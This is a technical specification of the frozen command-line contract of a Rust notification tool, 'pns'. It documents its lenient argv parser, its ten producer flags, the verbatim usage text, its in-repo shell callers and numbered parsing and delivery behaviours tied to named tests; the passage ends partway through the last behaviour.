# The legacy producer command-line surface

## Scope

This file specifies the frozen compatibility contract of `pns`'s producer invocation: the deliberately
lenient argv parser in `src/args.rs`, the ten producer flags it recognizes, the two help spellings, the
top-level dispatch in `src/main.rs:main` that decides whether an argv is a producer invocation or a
mistyped subcommand, the subcommand table printed by `const USAGE`, and the four hand-typed verbs whose
argv shapes callers outside this crate depend on (`pns <harness>-hook`, `pns gate <harness>-hook`,
`pns loop begin|end`, `pns pulse <exit-code>`). It does not specify what a delivered event renders as,
which channels exist, how the decision ring or the journal are written, or any behavior of the daemon,
the lamps, the home probe or the router beyond the argv that reaches them. Everything asserted here is
derived from the code in this crate and the tests in `src/args.rs`, `src/lights.rs`, `src/pulse.rs`,
`tests/dispatch.rs` and `tests/hooks.rs`; anything a reader might expect and that no code or test
establishes is written as a `NOT ESTABLISHED:` line rather than guessed.

## The flag table

Every flag the parser recognizes. "Absent value" means the flag is the last token, or the next token is
itself a recognized flag. "Unknown next token" means the next token is not a flag `is_producer_flag`
knows.

| Flag             | Argument shape                           | Absent value                                                                                  | Unknown next token                                                             | Pinned by                                                                                                                                                 |
| ---------------- | ---------------------------------------- | --------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------ | --------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `--agent`        | one following token, free text           | warn `--agent given without a value; ignoring`, field stays empty, token left for its own arm | taken as the value verbatim, no warning                                        | `src/args.rs:a_trailing_value_flag_is_warned_and_ignored`, `src/args.rs:an_unrecognized_token_is_still_taken_as_a_value`                                  |
| `--state`        | one following token, free text           | warn `--state given without a value; ignoring`, field stays empty                             | taken as the value verbatim, no warning                                        | `src/args.rs:help_in_value_position_is_still_just_a_value`, `tests/dispatch.rs:help_in_value_position_is_still_just_a_value`                              |
| `--project`      | one following token, free text           | warn `--project given without a value; ignoring`, field stays empty                           | taken as the value verbatim, no warning                                        | `src/args.rs:every_value_flag_lands_in_its_field`                                                                                                         |
| `--branch`       | one following token, free text           | warn `--branch given without a value; ignoring`, field stays empty                            | taken as the value verbatim, no warning                                        | `src/args.rs:every_value_flag_lands_in_its_field`                                                                                                         |
| `--detail`       | one following token, free text           | warn `--detail given without a value; ignoring`, field stays empty                            | taken as the value verbatim, no warning                                        | `src/args.rs:a_trailing_value_flag_is_warned_and_ignored`, `src/args.rs:the_long_running_flag_is_protected_from_being_eaten_like_every_other_one`         |
| `--pane`         | one following token, a pane id           | warn `--pane given without a value; ignoring`, field stays empty                              | taken as the value verbatim, then judged by `safety::pane_is_safe` at dispatch | `src/args.rs:a_recognized_flag_is_never_consumed_as_a_value`, `tests/dispatch.rs:a_pane_with_shell_metacharacters_is_scrubbed_from_every_delivered_event` |
| `--channel`      | one following token, a hermes route name | warn `--channel given without a value; ignoring`, field stays empty (the default route)       | taken as the value verbatim, then judged by `safety::route_name_is_usable`     | `src/args.rs:the_channel_flag_names_a_route_and_is_protected_like_every_value_flag`                                                                       |
| `--local-only`   | no argument                              | Not applicable, it takes no value                                                             | Not applicable, it consumes nothing                                            | `tests/dispatch.rs:local_only_keeps_the_banner_and_reaches_nothing_off_the_machine`                                                                       |
| `--remote-only`  | no argument                              | Not applicable, it takes no value                                                             | Not applicable, it consumes nothing                                            | `tests/dispatch.rs:remote_only_delivers_through_hermes_alone`                                                                                             |
| `--long-running` | no argument                              | Not applicable, it takes no value                                                             | Not applicable, it consumes nothing                                            | `src/args.rs:the_long_running_flag_is_protected_from_being_eaten_like_every_other_one`                                                                    |
| `--help`, `-h`   | no argument                              | Not applicable, it takes no value                                                             | Not applicable, it consumes nothing                                            | `tests/dispatch.rs:the_help_flag_prints_the_usage_and_reaches_nothing_at_all`                                                                             |

The two lists behind the table are `src/args.rs:VALUE_FLAGS` (the seven value-taking flags) and
`src/args.rs:BARE_FLAGS` (`--long-running`, `--local-only`, `--remote-only`). `--help` and `-h` are
deliberately in NEITHER list: `src/args.rs:is_help_flag` answers them separately, which is what keeps
`--agent --help` an agent literally named `--help` rather than a warn-and-drop
(`src/args.rs:help_in_value_position_is_still_just_a_value`).

## The usage text, verbatim

`const USAGE` in `src/main.rs` is one text printed on request and on a refusal, because an operator who
mistyped and an operator who asked have the same question. It is the contract, reproduced exactly:

```text
pns: usage:
  pns [<producer flags>]           one notification, stated in argv
  pns hook <event>                 a harness hook: prompt, stop, stop-failure,
                                   blocked, asked, plan-ready, denied, resolved,
                                   model-switch, quota, config-change
  pns gate <harness>-hook          presence-gated pass-through to moshi-hook
  pns <harness>-hook               the same gate, spelled the way moshi calls it
  pns pulse <exit-code>            signal the lamps by hand
  pns quiet [<duration>|off]       the operator's mute
  pns daemon run|schedule|cancel   the clock
  pns lights tick|quiet            the lamps' upkeep
  pns loop begin|end               take the loop lamp by hand, and give it back
  pns nag                          card every outstanding approval
  pns recap --since <epoch> --until <epoch>
  pns setup [--force]              write a first config, one question at a time
  pns doctor                       one test send through every channel
  pns home                         one reading of the router, said out loud
  pns --help, -h                   this text

producer flags: --agent <name> --state <word> --project <name> --branch <name>
                --detail <text> --pane <id> --channel <route>
                --local-only --remote-only --long-running
```

The subcommand-specific usage texts are separate constants and are printed instead of `USAGE` when the
subcommand itself is mistyped:

- `src/main.rs:PULSE_USAGE`, whose backticks around the word `pulse` are part of the string:

  ```text
  pns: usage: pns pulse [<exit-code>] | pns pulse --help, -h (a bare `pulse` is a success pulse)
  ```

- `src/lights.rs:LOOP_USAGE`: `pns: usage: pns loop begin [--pane <id>] | pns loop end [--pane <id>]`

- `src/main.rs:LIGHTS_USAGE`: `pns: usage: pns lights tick | pns lights quiet [<place> [<duration>|off]]`

- `src/main.rs:DAEMON_USAGE`:
  `pns: usage: pns daemon run | pns daemon schedule --id <id> [--in <secs>] [--every <secs>] [--until +<secs>|<epoch>] [--unless-marker <name>] -- <event args> | pns daemon cancel --id <id>`

- `src/main.rs:QUIET_USAGE`:
  `pns: usage: pns quiet [<duration>|off]; duration is <count><s|m|h>, from 1s to 24h`

- `src/main.rs:SETUP_USAGE`:
  `pns: usage: pns setup [--force]; --force replaces an existing config, keeping it beside`

- `src/main.rs:DOCTOR_USAGE`: `pns: usage: pns doctor`

- `src/main.rs:RECAP_USAGE`: `pns: usage: pns recap --since <epoch> --until <epoch>`

- `src/main.rs:NAG_USAGE`:
  `pns: usage: pns nag (it takes no arguments: one fire cards every outstanding approval at once)`

`LIGHTS_USAGE` names a `<place>` argument; the vocabulary for that argument is the lamps' own and is out
of scope here.

## The in-repo callers of this contract

Enumerated by `grep -rn 'libexec/pns/pns'` over the repository, excluding `.git`, `target`,
`graphify-out` and the crate itself. Paths are repository-relative to the worktree root.

Producer invocations (the contract this file specifies):

| Caller                                                                                 | Command line                                                                                                                                   |
| -------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------- |
| `dot_bashrc.tmpl:576`                                                                  | `"$pns_engine" --long-running --agent shell --state "$state" --project "${PWD##*/}" --detail "$cmd ($dur)" --pane "${HERDR_PANE_ID:-}"`        |
| `dot_bashrc.tmpl:580`                                                                  | `"$pns_engine" --agent shell --state "$state" --project "${PWD##*/}" --detail "$cmd ($dur)" --pane "${HERDR_PANE_ID:-}"`                       |
| `dot_local/libexec/unattended-upgrades/helpers/log-entries.sh:517`                     | `"$pns_script" --remote-only --channel "$UNATTENDED_LOG_ROUTE" --agent "$agent" --state "$state" --project "$project" --detail "$detail" 9>&-` |
| `dot_local/libexec/unattended-upgrades/helpers/log-entries.sh:556`                     | `"$pns_script" --agent "$agent" --state log-channel-broken --project "$(unattended_log_host)" --detail "$(printf ...)" 9>&-`                   |
| `dot_local/libexec/unattended-upgrades/executable_homebrew-weekly-upgrade.sh:137`      | `"$ENGINE" --agent homebrew-weekly-upgrade --state "$state" --project "$(unattended_log_host ...)" --detail "$detail" 9>&-`                    |
| `dot_local/libexec/unattended-upgrades/claude/executable_report-plugin-updates.sh:174` | `"$ENGINE" --agent "$AGENT_NAME" --state "$state" --project "$(unattended_log_host ...)" --detail "$detail" 9>&-`                              |
| `dot_local/libexec/unattended-upgrades/agent-skills/executable_update-skills.sh:464`   | `"$relay_script" --agent update-skills --state exhausted --project skills --detail "$detail" 9>&-`                                             |
| `dot_local/libexec/unattended-upgrades/agent-skills/executable_update-skills.sh:2039`  | `"$relay_script" --agent update-skills --state build-failed --project skills ...`                                                              |
| `dot_local/libexec/unattended-upgrades/agent-skills/executable_update-skills.sh:2048`  | `"$relay_script" --agent update-skills --state validation-failed --project skills ...`                                                         |
| `dot_local/libexec/unattended-upgrades/agent-skills/executable_update-skills.sh:2656`  | `"$relay_script" --agent update-skills --state prereq-missing --project hermes-superpowers ...`                                                |
| `dot_local/libexec/unattended-upgrades/agent-skills/executable_update-skills.sh:2675`  | `"$relay_script" --agent update-skills --state routing-drift --project hermes-superpowers ...`                                                 |
| `dot_local/libexec/unattended-upgrades/agent-skills/executable_update-skills.sh:2709`  | `"$relay_script" --agent update-skills --state prereq-missing --project hermes ...`                                                            |
| `dot_local/libexec/unattended-upgrades/agent-skills/executable_update-skills.sh:2741`  | `"$relay_script" --agent update-skills --state hermes-blocked --project "$profile/$lock_key" ...`                                              |
| `dot_local/libexec/unattended-upgrades/agent-skills/executable_update-skills.sh:2752`  | `"$relay_script" --agent update-skills --state hermes-update-failed --project "$profile/$lock_key" ...`                                        |
| `dot_local/libexec/unattended-upgrades/agent-skills/executable_update-skills.sh:3098`  | `"$relay_script" --agent update-skills --state "$state" --project "$fork" --detail "$detail" 9>&-`                                             |
| `scripts/cutover-gate.sh:1012`                                                         | `"$relay" --agent cutover-gate --state 'done' --project cutover --detail "$note"`                                                              |

Non-producer callers of the same binary, listed because they share the argv[1] dispatch this contract
lives inside:

| Caller                                                                         | Command line                                                                             |
| ------------------------------------------------------------------------------ | ---------------------------------------------------------------------------------------- |
| `Library/LaunchAgents/com.webdavis.pns-daemon.plist.tmpl:9`                    | `<home>/.local/libexec/pns/pns daemon run`                                               |
| `private_dot_claude/modify_settings.json:328-387`                              | `<home>/.local/libexec/pns/pns hook <event>` for eleven events, one of them `>/dev/null` |
| `dot_local/libexec/pns/hooks/codex/executable_install-hooks.sh:12-13`          | `PNS_AGENT=codex $agent hook stop` and `PNS_AGENT=codex $agent hook blocked`             |
| `.chezmoiscripts/run_after_62-bounce-moshi-hook-on-upgrade.sh.tmpl:56`         | the binary path written into moshi's `helperBinary`, which then invokes `pns pi-hook`    |
| `private_dot_claude/pns-marketplace/plugins/pns/skills/loop/SKILL.md:15,34`    | `~/.local/libexec/pns/pns loop begin` and `~/.local/libexec/pns/pns loop end`            |
| `dot_config/uu/private_config.toml.tmpl:36`                                    | `[alerts] binary`, the engine `uu` shells out to for a failed lane                       |
| `dot_config/osquery/private_page-launchd-allowlist.txt:46`                     | the allowlisted program string `~/.local/libexec/pns/pns daemon run`                     |
| `.chezmoiscripts/run_onchange_after_64-update-skills-first-install.sh.tmpl:51` | `ENGINE`, resolved and passed to the updater                                             |

Two references are documents rather than callers and invoke nothing:
`docs/superpowers/plans/2026-09-01-nvim-overhaul-plan.md:878` and
`docs/superpowers/specs/2026-09-01-nvim-overhaul-design-v4.md:1087`.

`NOT ESTABLISHED:` the `uu` `[alerts] binary` argv. `dot_config/uu/private_config.toml.tmpl` names the
binary but not the flags `uu` passes it, and the `uu` crate is not in this repository, so the shape of
that producer invocation is not derivable here.

## Behaviors

### 1. Argv is read once, lossily

Given a process invocation with any bytes in argv\

When `main` starts\

Then argv is collected once as `Vec<String>` via `std::env::args_os().skip(1)` with `to_string_lossy().into_owned()` on each element, and every later reader works off that one collection.

- Success: a non-UTF-8 argument becomes a replacement-character token, which the lenient parser then
  treats as any other unknown token.
- Failure sources: none reachable. `std::env::args()` would panic on non-UTF-8; `args_os` plus lossy
  conversion is chosen at `src/main.rs:main` precisely so it cannot.
- Fail direction: degrade, never abort.
  `tests/dispatch.rs:a_non_unicode_argument_never_breaks_the_exit_zero_edge` passes a raw `0xff` byte and
  still observes the ordinary path.
- Thresholds: Not applicable, no numeric threshold.
- Required side effects: none.
- Forbidden side effects: no panic, no exit before dispatch.
- Timeout and cancellation: Not applicable, no clock is read here.
- Idempotency and duplicates: reading argv is pure. `second_argument` re-reads `std::env::args_os()`
  independently (`src/main.rs:second_argument`), which is a second read of the same immutable process
  argv, not a second answer.
- Privacy: argv may carry a `--detail` composed from a shell command line; nothing here logs it.
- Process ownership and cleanup: Not applicable, no child is spawned.
- Compatibility contract: stdout empty, stderr empty, no exit at this step. Naming test:
  `tests/dispatch.rs:a_non_unicode_argument_never_breaks_the_exit_zero_edge`.

### 2. A subcommand word is dispatched before the producer check

Given argv whose first token is one of `pulse`, `home`, `quiet`, `doctor`, `recap`, `daemon`, `lights`, `loop`, `nag`, `setup`, `gate`, `hook`, or a word `hooks::is_harness_subcommand` accepts\

When `main` runs its dispatch chain\

Then that subcommand's mode runs and the producer parser is never reached, whatever else argv carries.

- Success: the mode's own exit code is returned via `std::process::exit`, except `home`, which returns
  and therefore exits 0 (`src/main.rs:main`).
- Failure sources: a first token that is a subcommand word plus producer flags after it. The subcommand
  wins; the flags are then judged by that subcommand's own argument reader, not by `parse_args`.
- Fail direction: toward the subcommand. `pns pulse --agent x` is a pulse invocation with a two-token
  tail, which `pulse_mode` refuses with exit 2, not a producer event.
- Thresholds: Not applicable.
- Required side effects: none at the dispatch step itself.
- Forbidden side effects: no config load and no probe before the branch is chosen; every mode above
  `is_producer_argv` in `src/main.rs:main` is entered before any config read.
- Timeout and cancellation: Not applicable at this step.
- Idempotency and duplicates: pure branch on the first token.
- Privacy: Not applicable.
- Process ownership and cleanup: Not applicable.
- Compatibility contract: the ORDER of the chain is the contract, since `setup` sits above everything
  that loads a config and the harness word sits above `gate`. Naming test:
  `tests/hooks.rs:the_bare_harness_word_forwards_through_the_gate_and_returns_the_decision`.

### 2a. `NOT ESTABLISHED:` a subcommand word carrying producer flags

Looked for a test in `tests/dispatch.rs` and `tests/hooks.rs` asserting that, for example,
`pns doctor --agent x` is refused as a doctor invocation rather than delivered as an event. The nearest
is `tests/dispatch.rs:a_doctor_given_any_extra_word_prints_usage_exits_two_and_reaches_no_channel`, which
uses a bare extra word and not a producer flag. The ordering claim in behavior 2 is read off
`src/main.rs:main` alone.

### 3. A word that names no command is refused

Given argv carrying no token that `is_producer_flag` or `is_help_flag` accepts, and whose first token is not a subcommand\

When `main` reaches `is_producer_argv`\

Then the whole usage text is written to stderr and the process exits 2, having delivered nothing.

- Success: exit 2, `USAGE` on stderr, stdout empty, no state directory created, no child spawned.
- Failure sources: a mistyped subcommand (`stpo`), a mistyped flag (`--wat`, `-help`, `--HELP`,
  `--help=x`, `--agent=claude`), a bare `-` or `--`, and the literal empty string.
- Fail direction: closed. Falling through to the lenient parser is the defect this exists to prevent; it
  used to render an empty event and raise a banner reading `pns · done`.
- Thresholds: the test is membership in the two flag lists plus the two help spellings, not a prefix
  test. A dash-led first word is no longer a free pass
  (`tests/dispatch.rs:a_dash_led_first_word_is_no_longer_a_free_pass_for_an_empty_event`). One step
  either side: `--agent=claude` is refused (exit 2), `--agent claude` is a producer invocation (exit 0).
- Required side effects: `eprint!("{USAGE}")` then `std::process::exit(2)`.
- Forbidden side effects: no config load, no probe, no channel spawn, no state directory. Both refusal
  tests assert `sandbox.spawned() == ""` and `!sandbox.state().exists()`.
- Timeout and cancellation: Not applicable.
- Idempotency and duplicates: pure.
- Privacy: the refused word is not echoed; only the fixed usage text is printed.
- Process ownership and cleanup: Not applicable, nothing is spawned.
- Compatibility contract: stdout exactly empty, stderr contains the word `usage`, exit code exactly 2.
  Naming tests: `tests/dispatch.rs:a_word_that_names_no_command_is_refused_and_delivers_nothing`,
  `tests/dispatch.rs:a_dash_led_first_word_is_no_longer_a_free_pass_for_an_empty_event`,
  `tests/dispatch.rs:a_typed_empty_word_is_refused_unlike_the_bare_invocation_beside_it`.

### 4. A bare invocation is the empty event the contract calls valid

Given argv with no arguments at all\

When `main` reaches `is_producer_argv`\

Then `argv.is_empty()` answers true, the parser produces `EventArgs::default()`, and the empty event is rendered and delivered.

- Success: the event reaches every planned channel and the process exits 0.
- Failure sources: conflating "no argv at all" with "argv is the literal empty string" would swallow this
  arm. `pns ""` is a one-element argv and is refused instead
  (`tests/dispatch.rs:a_typed_empty_word_is_refused_unlike_the_bare_invocation_beside_it`).
- Fail direction: open. `EventArgs` defaults every field, so an empty event is a legitimate event, and
  `render::title` and `render::message` fill in `pns`, `done` and `done` for the empty fields
  (`src/render.rs:title`, `src/render.rs:message`).
- Thresholds: zero arguments delivers; one empty-string argument refuses.
- Required side effects: the ordinary event tail (decision ring record, journal on a miss, activity ring
  line).
- Forbidden side effects: none specific.
- Timeout and cancellation: the hermes leg carries the sync deadline described in behavior 13 only when
  `--remote-only` made it synchronous; a bare invocation's legs are `ReportMode::Silent`
  (`src/routing.rs:channel_plan`).
- Idempotency and duplicates: each invocation is one occurrence and one decision-ring record.
- Privacy: nothing from argv is present, so nothing from argv can leak.
- Process ownership and cleanup: channels are spawned by `dispatch_legs` and may be detached; that is the
  channel contract, not this one.
- Compatibility contract: exit 0. Naming test:
  `tests/dispatch.rs:a_bare_invocation_is_still_the_empty_event_the_contract_calls_valid`.

### 5. A stray unrecognized token in front of the flags still delivers

Given argv such as `stray --agent claude --state done --detail "a summary"`\

When `is_producer_argv` reads the WHOLE of argv rather than its first token\

Then the invocation counts as a producer invocation and the event is delivered.

- Success: every configured channel fires and the leading token is skipped silently by `parse_args`.
- Failure sources: a refusal keyed on the first word alone would drop real notifications, which is the
  mirror of the bug behavior 3 exists to fix (`src/main.rs:is_producer_argv` doc comment).
- Fail direction: open, deliberately. An invocation carrying producer flags is a producer invocation
  whatever leads it.
- Thresholds: at least one recognized flag or help spelling anywhere in argv.
- Required side effects: the ordinary event tail.
- Forbidden side effects: the stray token must not become a field value and must not warn.
- Timeout and cancellation: Not applicable.
- Idempotency and duplicates: one occurrence.
- Privacy: Not applicable.
- Process ownership and cleanup: Not applicable.
- Compatibility contract: exit 0, stderr carries no warning about the stray token. Naming test:
  `tests/dispatch.rs:a_producer_invocation_led_by_a_stray_word_still_delivers`, with the parser half at
  `src/args.rs:unknown_arguments_are_skipped_in_silence`.

### 6. Every value flag lands in its own field

Given `--agent claude --state done --project dotfiles --branch main --detail "a summary" --pane wW:p21 --local-only`\

When `parse_args` walks the tokens\

Then each value reaches its own `EventArgs` field, `local_only` is set, `remote_only` stays false, and no warning is produced.

- Success: `agent`, `state`, `project`, `branch`, `detail`, `pane` and `channel` are exactly the tokens
  that followed their flags, byte for byte.
- Failure sources: a mismatched arm in the `match flag` block would cross two fields. The `--pane` arm is
  the wildcard `_ =>` branch (`src/args.rs:parse_args`), so a new value flag added to `VALUE_FLAGS`
  without its own arm would silently land in `pane`.
- Fail direction: Not applicable, there is no failure path; the parse always succeeds.
- Thresholds: Not applicable.
- Required side effects: none, `parse_args` is pure and returns the warnings rather than printing them.
- Forbidden side effects: no value is trimmed, lowercased or otherwise normalized here.
- Timeout and cancellation: Not applicable.
- Idempotency and duplicates: a repeated flag OVERWRITES, last one wins, because each arm assigns.
  `NOT ESTABLISHED:` no test asserts the last-wins rule; it is read off the assignment in
  `src/args.rs:parse_args`.
- Privacy: `--detail` carries free text and is stored verbatim in `EventArgs`.
- Process ownership and cleanup: Not applicable.
- Compatibility contract: the seven field names and their flags are frozen. Naming test:
  `src/args.rs:every_value_flag_lands_in_its_field`.

### 7. A value flag with no value warns and is ignored

Given a value flag as the last token of argv\

When `parse_args` peeks and finds nothing\

Then it pushes `"<flag> given without a value; ignoring"` onto the warnings and continues, leaving the field empty.

- Success: the field keeps its default (empty), the rest of argv parses normally, and `event_mode` prints
  each warning to stderr prefixed `pns: `.
- Failure sources: none; a missing value is a warned degradation, never a refusal.
- Fail direction: open. The engine sits on an always-exit-0 notification path (`src/args.rs` module doc),
  so an argument problem warns and degrades rather than aborting.
- Thresholds: exactly one warning per ignored flag
  (`src/args.rs:a_trailing_value_flag_is_warned_and_ignored` asserts `warnings.len() == 1`).
- Required side effects: `eprintln!("pns: {warning}")` once per warning, at `src/main.rs:event_mode`, and
  only AFTER the help arm has been checked.
- Forbidden side effects: the flag must not consume any token, and must not set its field to the flag
  name.
- Timeout and cancellation: Not applicable.
- Idempotency and duplicates: two ignored flags produce two warnings, in argv order.
- Privacy: the warning names the flag, never a value.
- Process ownership and cleanup: Not applicable.
- Compatibility contract: the exact warning string is `--detail given without a value; ignoring` for
  `--detail`, and the printed line is that string prefixed with `pns: `. Naming test:
  `src/args.rs:a_trailing_value_flag_is_warned_and_ignored`.

### 8. A recognized flag standing in value position is never consumed

Given `--pane --local-only --agent claude`, or `--detail --long-running`, or `--detail --channel log`\

When `parse_args` peeks and `is_producer_flag` accepts the next token\

Then the value flag warns and is ignored WITHOUT consuming that token, so the recognized flag reaches its own arm and still applies.

- Success: `pane` stays empty and `local_only` is true; `detail` stays empty and `long_running` is true;
  `detail` stays empty and `channel` is `log`.
- Failure sources: this is the class of bug the rule exists for. Consuming the token would deliver an
  event the caller narrowed with `--local-only`, and it would lose the tier that decides the lamps while
  putting a flag name in the notification's summary.
- Fail direction: closed against silent loss. The drop is warned about, and the protected flag survives.
- Thresholds: protection is membership in `VALUE_FLAGS` or `BARE_FLAGS` (`src/args.rs:is_producer_flag`).
  One step either side: `--detail --long-running` protects the tier; `--detail --bogus` sets `detail` to
  `--bogus`.
- Required side effects: exactly one warning naming the value flag, not the protected one.
- Forbidden side effects: no token consumption; `continue` is taken before `tokens.next()`.
- Timeout and cancellation: Not applicable.
- Idempotency and duplicates: Not applicable.
- Privacy: Not applicable.
- Process ownership and cleanup: Not applicable.
- Compatibility contract: `BARE_FLAGS` exists as a LIST rather than a comparison chain specifically
  because `--long-running` was once handled but not listed, and vanished without a warning
  (`src/args.rs:BARE_FLAGS` doc comment). Naming tests:
  `src/args.rs:a_recognized_flag_is_never_consumed_as_a_value`,
  `src/args.rs:the_long_running_flag_is_protected_from_being_eaten_like_every_other_one`,
  `src/args.rs:the_channel_flag_names_a_route_and_is_protected_like_every_value_flag`.

### 9. An unrecognized token standing in value position IS the value

Given `--agent --bogus`\

When `parse_args` peeks and `is_producer_flag` refuses the next token\

Then the token is taken as the value verbatim and no warning is produced.

- Success: `agent == "--bogus"`, warnings empty.
- Failure sources: none. This is the leniency the bash deliberately retained
  (`src/args.rs:an_unrecognized_token_is_still_taken_as_a_value`).
- Fail direction: open, toward delivering something rather than dropping it.
- Thresholds: only RECOGNIZED flags are protected. A leading dash is not what makes a token protected.
- Required side effects: none.
- Forbidden side effects: no warning, no drop.
- Timeout and cancellation: Not applicable.
- Idempotency and duplicates: Not applicable.
- Privacy: Not applicable.
- Process ownership and cleanup: Not applicable.
- Compatibility contract: exactly this leniency; widening `is_producer_flag` to cover `--help` would
  break it, which is why behavior 11 is pinned twice. Naming test:
  `src/args.rs:an_unrecognized_token_is_still_taken_as_a_value`.

### 10. Unknown arguments in flag position are skipped in silence

Given `stray --agent claude --wat`\

When a token reaches the top of the loop and matches no arm\

Then the catch-all `_ => {}` skips it with no warning and no field change.

- Success: `agent == "claude"`, warnings empty.
- Failure sources: none at the parser. The top-level refusal in behavior 3 is what prevents this leniency
  from turning a typed subcommand into an empty event, and it runs BEFORE the parser.
- Fail direction: open at the parser, closed at the dispatch above it.
- Thresholds: Not applicable.
- Required side effects: none.
- Forbidden side effects: no warning is emitted for an unknown flag-position token. This is why a typo
  like `pns --wat` has to be caught by `is_producer_argv` and not here.
- Timeout and cancellation: Not applicable.
- Idempotency and duplicates: Not applicable.
- Privacy: Not applicable.
- Process ownership and cleanup: Not applicable.
- Compatibility contract: silence, not a warning. Naming test:
  `src/args.rs:unknown_arguments_are_skipped_in_silence`.

### 11. `--help` and `-h` in flag position print the usage and reach nothing

Given any of `--help`, `-h`, `--agent claude --help`, `--local-only --help`, `-- --help`, `stray --help`\

When the token reaches the top of `parse_args`'s loop unconsumed\

Then `parsed.help` is set, and `event_mode` prints `USAGE` to stdout and returns before any config load, any probe, any warning print and any delivery.

- Success: exit 0, `USAGE` on stdout, stderr exactly empty, nothing spawned, no state directory created.
- Failure sources: help used to fall through the parser as an unknown token, which loaded the config,
  spawned every presence probe and delivered a notification titled `pns · done`.
- Fail direction: closed. The help arm sits above the warning loop in `src/main.rs:event_mode`, so even
  an argv that also earned warnings prints only the usage.
- Thresholds: the two spellings exactly. `-help`, `--HELP` and `--help=x` are none of them and are
  refused by behavior 3
  (`tests/dispatch.rs:a_dash_led_first_word_is_no_longer_a_free_pass_for_an_empty_event`).
- Required side effects: `print!("{USAGE}")` on stdout, and return.
- Forbidden side effects: no config read, no probe spawn, no state directory, no warning print. The test
  asserts `sandbox.spawned() == ""` and `!sandbox.state().exists()`.
- Timeout and cancellation: Not applicable, no clock and no child.
- Idempotency and duplicates: repeated help spellings set one boolean; the usage prints once.
- Privacy: no machine read at all, so nothing about the machine reaches stdout.
- Process ownership and cleanup: Not applicable, nothing is spawned.
- Compatibility contract: stdout contains `usage`, stderr exactly `""`, exit code exactly 0. Naming
  tests: `tests/dispatch.rs:the_help_flag_prints_the_usage_and_reaches_nothing_at_all`,
  `tests/dispatch.rs:help_in_flag_position_wins_wherever_it_reaches_the_event_parser`,
  `src/args.rs:help_in_flag_position_is_recognized_wherever_it_sits`.

### 12. `--help` in value position is still just a value

Given `--agent --help --state done`, or `--agent claude --state --help`\

When `parse_args` reaches the value arm before the help arm sees the token\

Then `--help` is the field's value, `parsed.help` stays false, no warning is produced, and the event is delivered normally.

- Success: the delivered event carries `agent == "--help"` or `state == "--help"`.
- Failure sources: adding `--help` to `is_producer_flag` would flip this into a warn-and-drop, which is
  named as the wrong fix in both the code comment and the test comment.
- Fail direction: open, toward delivering the literal value.
- Thresholds: position decides. Flag position sets help (behavior 11); value position does not.
- Required side effects: none.
- Forbidden side effects: no usage print, no warning.
- Timeout and cancellation: Not applicable.
- Idempotency and duplicates: Not applicable.
- Privacy: Not applicable.
- Process ownership and cleanup: Not applicable.
- Compatibility contract: pinned at both levels so a "fix" at either one fails. Naming tests:
  `src/args.rs:help_in_value_position_is_still_just_a_value`,
  `tests/dispatch.rs:help_in_value_position_is_still_just_a_value`.

### 13. `--local-only` keeps the local surfaces alone

Given `--local-only` on a producer invocation\

When `routing::channel_plan` filters the selection\

Then only plugins whose routing declaration says `local` survive, and the legs run in `ReportMode::Silent`.

- Success: the banner fires; neither the mobile card nor hermes does.
- Failure sources: a presence-gated plugin is dropped whenever the phone verdict is no, under every flag,
  so `--local-only` alone never resurrects the phone.
- Fail direction: narrowing. A sensor plugin is never a leg under any flag
  (`src/routing.rs:channel_plan`, `PluginKind::Sensor => None`).
- Thresholds: Not applicable.
- Required side effects: the ordinary event tail still runs.
- Forbidden side effects: nothing off the machine is reached.
- Timeout and cancellation: legs are `Silent`, so no synchronous deadline applies on this path.
- Idempotency and duplicates: one occurrence.
- Privacy: the point of the flag is that nothing leaves the machine.
- Process ownership and cleanup: local channels are spawned as usual.
- Compatibility contract: exit 0, the banner event file written, no hermes and no mobile. Naming test:
  `tests/dispatch.rs:local_only_keeps_the_banner_and_reaches_nothing_off_the_machine`.

### 14. `--remote-only` keeps the durable legs alone, synchronously

Given `--remote-only` on a producer invocation\

When `routing::channel_plan` filters the selection\

Then only plugins whose routing declaration says `durable` survive, and the mode becomes `ReportMode::ReportOutcome`, which is what makes an undelivered log entry visible.

- Success: hermes fires with `mode == "sync"`; neither the banner nor the mobile card does. The engine
  prints one `pns: ` line naming the outcome, which is the line
  `dot_local/libexec/unattended-upgrades/helpers/log-entries.sh` greps for as `^pns: posted HTTP 2`.
- Failure sources: a gateway that refuses or hangs. The outcome is REPORTED on stdout; the exit code does
  not move.
- Fail direction: loud but non-fatal. `pns` exits 0 whatever the gateway answered, which is why the
  caller reads the stdout line rather than the status.
- Thresholds: the sync deadline is `remote_deadline(PNS_REMOTE_TIMEOUT)`, default 5 seconds, clamped to
  86400 seconds, and a literal `0` means no deadline at all (`src/channels/hermes.rs:remote_deadline`).
  One step either side: `PNS_REMOTE_TIMEOUT=0` waits forever by caller intent; an unparseable value falls
  back to 5 seconds rather than to zero or forever.
- Required side effects: one printed outcome line per leg whose mode is `ReportOutcome`
  (`src/main.rs:run_event`).
- Forbidden side effects: no banner, no phone card.
- Timeout and cancellation: as above; the deadline is ureq's, and the process does not fork for this leg.
- Idempotency and duplicates: one post per invocation.
- Privacy: the detail text crosses the network to the configured gateway.
- Process ownership and cleanup: the caller closes fd 9 (`9>&-`) on several of the weekly-job call sites,
  because `pns` detaches channels that would otherwise inherit a held flock.
- Compatibility contract: the stdout line's prefix `pns: ` and the substring `posted HTTP 2` are what the
  weekly log helper depends on. Naming tests:
  `tests/dispatch.rs:remote_only_delivers_through_hermes_alone`,
  `tests/dispatch.rs:hermes_is_sync_on_the_log_path_which_is_what_makes_an_undelivered_entry_visible`.
  `NOT ESTABLISHED:` no test in this crate asserts the exact string `pns: posted HTTP 200`; the comment
  at `dot_local/libexec/unattended-upgrades/helpers/log-entries.sh:485-488` points at `tests/native.rs`
  for the writer's side and records that the reader side is unpinned.

### 15. Both delivery-scope flags together deliver nothing and say so

Given `--local-only --remote-only` on one invocation\

When `routing::channel_plan` sees both\

Then it returns an empty plan immediately, and `run_event` prints one exact line to stdout because a silent exit is indistinguishable from delivery.

- Success: stdout carries exactly this line, verbatim:

  ```text
  pns: post SKIPPED -- --local-only and --remote-only were both given, which suppresses every channel; nothing was sent
  ```

  and no channel is spawned.

- Failure sources: none; the contradiction is the caller's and is reported rather than resolved.

- Fail direction: loud. The suppression is stated ONLY for this contradiction; every other empty plan
  exits silently (`src/main.rs:run_event`, the `if event.local_only && event.remote_only` guard inside
  the empty-legs branch).

